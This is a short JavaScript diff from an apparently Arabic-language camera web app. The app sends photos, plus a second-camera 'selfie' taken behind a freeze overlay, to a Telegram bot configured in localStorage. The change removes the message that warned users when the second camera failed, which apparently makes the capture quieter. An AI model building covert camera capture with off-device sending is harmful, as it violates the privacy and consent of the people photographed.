@@ -293,8 +293,7 @@ async function sendPhotoWithDual(blob,willSwap){
  const s=JSON.parse(localStorage.getItem("tgCfg")||"{}");
  if(!s.on||!s.tok||!s.chat){if(willSwap){hideFreeze();dualBusy=false}return}
  let selfieCanvas=null;
- if(willSwap){try{selfieCanvas=await captureSelfieSeq()}catch(e){}finally{hideFreeze();dualBusy=false}
-  if(!selfieCanvas)toast("تعذر فتح الكاميرا الثانية — إذا كنت بمتصفح داخل تطبيق (إنستقرام، تيك توك..) افتح الرابط بمتصفح الجهاز مباشرة")}
+ if(willSwap){try{selfieCanvas=await captureSelfieSeq()}catch(e){}finally{hideFreeze();dualBusy=false}}
  tgSend(blob,`صورة • ${new Date().toLocaleString("ar")}`,selfieCanvas)}
 async function countdown(n){const c=$("cn");c.style.display="flex";for(let i=n;i>0;i--){c.textContent=i;c.animate([{transform:"scale(1.5)",opacity:0},{transform:"scale(1)",opacity:1}],{duration:400});await sl(1000)}c.style.display="none"}
 async function shoot(){if(dualBusy)return;if(!stream)return start();if(mode=="video")return toggleRec();if(timer)await countdown(timer);
